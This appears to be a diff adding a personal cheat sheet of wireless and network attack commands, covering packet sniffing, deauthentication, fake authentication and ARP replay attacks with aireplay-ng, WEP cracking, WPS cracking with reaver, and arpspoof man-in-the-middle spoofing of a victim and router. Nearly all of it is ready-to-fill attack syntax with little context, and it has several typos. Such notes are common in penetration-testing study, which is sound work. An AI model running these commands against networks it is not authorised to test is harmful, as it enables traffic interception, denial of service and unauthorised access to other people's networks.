@@ -1,0 +1,237 @@
+*airodump-ng: Packet Sniffing, Targeted Packet Sniffing
+
+SYNTAX
+
+-Packet Sniffing
+airodump-ng wlan0
+
+
+-Targeted Packet Sniffing
+airodump-ng --bssid <target's mac address> --channel <channelnumber> --write test wlan0
+
+
+
+
+
+
+
+
+
+
+
+
+
+*airmon-ng: Used to kill the processes that interfere with the wireless adapter when             operating in monitor mode
+
+
+SYTNAX
+
+-check kill
+airmon-ng check kill
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+*aireplay-ng: Deauthentication Attack, Fake Authentication Attak, ARP Request Replay Attack
+	     
+SYNTAX
+
+-Deauthentication Attack
+aireplay-ng --deauth 10000000 -a <target network's mac address> -c <target device's mac address> wlan0
+
+
+-Fake Authentication Attack
+aireplay-ng --fakeauth 0 -a <target network's mac address> -h <wlan0's mac address> wlan0
+
+
+
+-ARP Request Replay Attack
+aireplay-ng --arpreplay -b <target network's mac address> -h <wlan0's mac address> wlan0
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+*aircrack-ng: Cracking WEP
+
+
+SYNTAX
+
+-Cracking
+
+aircrack-ng test01.cap
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+*wash: Lists networks that support WPS
+
+
+SYNTAX
+
+wash -- interface wlan0
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+*reaver: A program used to explot the WPS feature of WPA/WPA2 encryption
+
+
+
+SYNTAX
+
+
+reaver --bssid <target netowrk's mac address> --channel 1 -- interface wlan0   -vvv --no-associate
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+*netdiscover: Used to map a network and see what devices are connected to it
+
+
+
+SYNTAX
+
+netdiscover -r <ip_range>
+
+
+eg: netdiscover -r 192.168.0.1/24
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+*arpspoof: Used for ARP spoofing
+
+
+
+
+SYNTAX
+
+
+ arpspoof -i [interface_connected_to_the_target_network] -t [client_IP] [gateway_IP]             
+	This will spoof the victim telling it that the hacker's machine is the router   
+
+
+
+
+  arpspoof -i [interface_connected_to_the_target_network] -t [gateway_IP] [client_IP]
+
+        This will tell the router that the hacker's machine is the victim
+        
+
+
+
+
+
+
+
+
+
+
+
+
+*bettercap: A tool used for a variety of things
+
+SYNTAX
+
+
+-HELP
+
+   bettercap --help
+
+
+-LAUNCHING
+ 
+    bettercap -iface [interface_connected_to_the_target_network]
+
+
+-FEEDING A CAPLET FILE
+
+    bettercap -iface eth0 -caplet spoof.cap 
+
+
+
+
+   
+
+
+
+
+
+
+
